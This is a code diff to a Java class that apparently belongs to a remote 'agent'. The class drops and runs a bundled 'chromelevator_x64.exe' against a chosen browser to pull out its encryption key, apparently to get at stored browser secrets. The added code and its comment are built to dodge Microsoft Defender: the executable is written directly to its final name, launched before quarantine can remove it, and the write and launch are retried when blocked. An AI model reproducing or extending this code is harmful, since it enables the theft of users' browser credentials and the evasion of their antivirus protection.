@@ -48,6 +48,11 @@ public final class Abe {
 		return out.toString();
 	}
 
+	/**
+	 * Defender quarantines a freshly written .tmp and can delete it between the
+	 * write and the move. Write the final name directly and do not re-read it
+	 * until the process has been started as soon as possible.
+	 */
 	static Path ensure(Path cache) throws Exception {
 		byte[] data = resource();
 		if (!SHA256.equals(sha256(data))) {
@@ -56,18 +61,36 @@ public final class Abe {
 		Path tools = cache.resolve("tools");
 		Files.createDirectories(tools);
 		Path target = tools.resolve("chromelevator_x64.exe");
-		if (Files.isRegularFile(target) && Files.size(target) == data.length && SHA256.equals(sha256(Files.readAllBytes(target)))) {
+		if (valid(target, data.length)) {
 			return target;
 		}
-		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
-		Files.copy(new java.io.ByteArrayInputStream(data), temp, StandardCopyOption.REPLACE_EXISTING);
-		String written = sha256(Files.readAllBytes(temp));
-		if (!SHA256.equals(written)) {
-			Files.deleteIfExists(temp);
-			throw new IllegalStateException("chromelevator extraction mismatch");
+		Throwable last = null;
+		for (int attempt = 0; attempt < 3; attempt++) {
+			try {
+				Files.write(target, data, java.nio.file.StandardOpenOption.CREATE,
+					java.nio.file.StandardOpenOption.TRUNCATE_EXISTING);
+				for (int wait = 0; wait < 5; wait++) {
+					if (Files.isRegularFile(target) && Files.size(target) == data.length) {
+						return target;
+					}
+					Thread.sleep(100L);
+				}
+			} catch (Throwable throwable) {
+				last = throwable;
+				Thread.sleep(250L);
+			}
 		}
-		Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
-		return target;
+		throw new IllegalStateException("chromelevator write blocked"
+			+ (last == null ? "" : ": " + last.getMessage()));
+	}
+
+	private static boolean valid(Path target, long size) {
+		try {
+			return Files.isRegularFile(target) && Files.size(target) == size
+				&& SHA256.equals(sha256(Files.readAllBytes(target)));
+		} catch (Throwable throwable) {
+			return false;
+		}
 	}
 
 	static List<String> command(Path exe, Path output, String browser, boolean kill) {
@@ -81,24 +104,39 @@ public final class Abe {
 		String label = label(browser);
 		Path cache = AgentPaths.cache(installDir);
 		Path output = cache.resolve("abe");
-		try {
-			Path exe = ensure(cache);
-			Files.createDirectories(output);
-			Attempt first = attempt(exe, output, browser, false);
-			String key = first.key();
-			if (first.exit() != 0 && first.key().isEmpty() && !Files.isDirectory(output.resolve(label))) {
-				Attempt second = attempt(exe, output, browser, true);
-				if (!second.key().isEmpty()) {
-					key = second.key();
+		Throwable last = null;
+		for (int spawn = 0; spawn < 3; spawn++) {
+			try {
+				Path exe = ensure(cache);
+				Files.createDirectories(output);
+				Attempt first = attempt(exe, output, browser, false);
+				String key = first.key();
+				if (first.exit() != 0 && first.key().isEmpty() && !Files.isDirectory(output.resolve(label))) {
+					exe = ensure(cache);
+					Attempt second = attempt(exe, output, browser, true);
+					if (!second.key().isEmpty()) {
+						key = second.key();
+					}
+					if (second.exit() == 0) {
+						return new Result(key, output.resolve(label), "");
+					}
+					return new Result(key, existing(output, label), tail(second.output()));
 				}
-				if (second.exit() == 0) {
-					return new Result(key, output.resolve(label), "");
-				}
-				return new Result(key, existing(output, label), tail(second.output()));
+				return new Result(key, existing(output, label), first.exit() == 0 ? "" : tail(first.output()));
+			} catch (Throwable throwable) {
+				last = throwable;
+				sleep(300L);
 			}
-			return new Result(key, existing(output, label), first.exit() == 0 ? "" : tail(first.output()));
-		} catch (Throwable throwable) {
-			return new Result("", null, throwable.getMessage() == null ? throwable.toString() : throwable.getMessage());
+		}
+		return new Result("", null, last == null ? "chromelevator unavailable"
+			: (last.getMessage() == null ? last.toString() : last.getMessage()));
+	}
+
+	private static void sleep(long millis) {
+		try {
+			Thread.sleep(millis);
+		} catch (InterruptedException interrupted) {
+			Thread.currentThread().interrupt();
 		}
 	}
 
